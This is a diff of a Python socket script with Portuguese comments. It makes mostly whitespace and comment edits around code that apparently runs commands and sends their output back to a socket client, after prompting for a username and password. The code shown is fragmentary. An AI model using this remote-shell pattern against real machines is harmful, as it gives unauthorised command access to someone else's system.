@@ -147,7 +147,7 @@ info=f"""
     ╚═════════════════════════════════════════════════════════════════╝
 """
 
-
+""""""
 def handle_client(client_sock):
     vusername = getpass.getuser()
     client_sock.send(f"{vusername}@{hostname}".encode())
@@ -158,7 +158,7 @@ def handle_client(client_sock):
     client_sock.send(f'[{green}Password{off}]: '.encode()) 
     password = client_sock.recv(1024).decode().strip()
    
-  # O usuario e senha
+# O usuario e senha
 username = input("Digite seu nome de usuário: ")
 
 if username == 'Machine':
@@ -195,9 +195,9 @@ while True:
     output_error = op.stderr.read()
     print("[-] mandando resposta...")
     client.send(output + output_error)
+    
 
 # servidor socket
-
 HOST = '127.0.0.1'  # endereço do servidor (em branco significa que irá usar o endereço local)
 PORT = 1010  # porta de conexão
 
@@ -206,18 +206,15 @@ PORT = 1010  # porta de conexão
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # vincula o socket com o endereço e porta
-
 server_socket.bind((HOST, PORT))
 
 # define o número máximo de conexões pendentes
-
 server_socket.listen(1)
 
 print('Aguardando conexão...')
 
 # espera por uma conexão
 client_socket, client_address = server_socket.accept()
-
 print('Conectado por', client_address)
 
 # loop principal
@@ -229,7 +226,7 @@ while True:
         break
 
     # processa os dados recebidos
-    # exemplo: converte os dados para maiúsculas e envia de volta para o cliente
+    # exemplo: converte os dados para maiúsculas e envia de volta para o 
     response = data.upper()
 
     # envia a resposta para o cliente
